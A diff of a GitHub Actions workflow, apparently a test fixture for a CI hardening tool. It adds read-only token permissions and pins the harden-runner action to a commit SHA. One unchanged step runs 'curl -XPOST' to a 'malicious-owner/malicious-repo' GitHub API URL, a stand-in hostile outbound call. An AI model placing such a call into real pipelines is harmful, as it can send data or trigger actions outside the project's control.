@@ -6,12 +6,15 @@ on:
 # permissions:
 #   contents: read
 
+permissions:
+  contents: read
+
 jobs:
   dynamic-node:
     if: always()
     runs-on: ARMLinuxRunner
     steps:
-      - uses: step-security/harden-runner@rc
+      - uses: step-security/harden-runner@4d991eb9b905ef189e4c376166672c3f2f230481 # rc
         with:
           egress-policy: audit
       - uses: actions/checkout@v3
@@ -28,7 +31,7 @@ jobs:
     if: always()
     runs-on: ARMLinuxRunner
     steps:
-      - uses: step-security/harden-runner@rc
+      - uses: step-security/harden-runner@4d991eb9b905ef189e4c376166672c3f2f230481 # rc
         with:
           egress-policy: audit
       - run: curl -XPOST https://api.github.com/repos/malicious-owner/malicious-repo
